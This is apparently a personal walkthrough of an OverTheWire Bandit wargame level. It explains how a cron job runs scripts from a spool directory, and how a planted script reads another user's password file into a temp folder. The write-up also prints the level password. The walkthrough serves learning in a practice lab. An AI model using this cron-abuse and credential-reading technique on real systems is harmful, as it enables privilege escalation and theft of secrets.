# Level 23-24: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. This Level requires you to create a shell-script, which is removed once executed.

## Password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
## Method
This level starts similarly to the previous two levels
```
cat cronjob_bandit24.sh
```
Prints this into the terminal
```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
```
cat /usr/bin/cronjob_bandit24.sh
```
Prints this script
```
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
- The cron job runs on a schedule where scripts in /var/spool/$myname/foo are executed as bandit24 then deleted (the $myname variable is interchangeable with bandit24 in this example) - there is more info on this  [here](#what-i-learned)
- The full script has been broken down [here](#script-breakdown)
- Because the scripts in that directory are scanned by the cron job and executed as bandit24, a script placed in there can be used to read the /etc/bandit_pass/bandit24 password file

Created a temp directory to work from as I don't have read and write permission in current directory
```
mktemp -d 
/tmp/tmp.JBDYQt56vj
```
Created a script file using nano which is a simple text-editor
```
cd /tmp/tmp.JBDYQt56vj
nano banditscript.sh
```
Created this script in banditscript.sh which reads the password file and redirects the output to a new file to be created within the tmp directory
```
cat /etc/bandit_pass/bandit24 > /tmp/tmp.JBDYQt56vj/password.txt
```
Give execute and write permissions to public for script and directory so that the script can be executed by anyone i.e. bandit24 and the directory can be written into by anyone to create the password file which is where the output from 'cat' is being redirected to 
```
chmod +x banditscript.sh
chmod +w .
```
Copy script into the directory that is scanned by cron job
```
cp banditscript.sh /var/spool/bandit24/foo
```
Listed contents in tmp directory - once the cron job ran on its schedule, the script was executed automatically by it and the 
```
ls 
banditscript.sh
ls
banditscript.sh password.txt
cat password.txt
```

### What I learned:
 '@reboot bandit24 /usr/bin/cronjob_bandit24.sh' indicates that the script is being run as bandit24. In the next line, the '* * * * *' each represent a time that the script is scheduled for which are the minute, the hour, the day of the month, the month, the day of the week; in that respective order i.e. @reboot means that the script is run every time the system reboots.

### Script Breakdown:
- 'for i in * .*;' means that 'i' will represent any file (*) in the current directory, and any dotfile (.*)

- 'if ["$i != "."] && ["$i != ".."]; then' this line iterates that if the variable 'i' (the filename as mentioned previously) is not (!=) equal to "." (in the current directory) and is not ".." (the directory above) 'then' the following block of code will be executed

- 'echo "Handling $i" the file is going to be handled by doing the following actions:

 - 'owner="$(stat --format "%U" "./$i")"' - firstly checking the owner of the file
 - 'if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then' if the owner of the file is bandit23 '&&' and (meaning AND - both conditions must be true for the next action to happen) and '[-f "$i"]' if $i is a **regular file** and not a directory, then the next action will be taken
 - 'timeout -s 9 60 "./$i"' the command will be run with a time limit through 'timeout', and when it times out, '-s 9' sends signal 9, which kills the script ("./$i")
- 'fi' ends the inner if statement
- 'rm -rf "./$i" fi' the file is removed and the outer if is closed
- 'done' closes the loop that began with 'for'
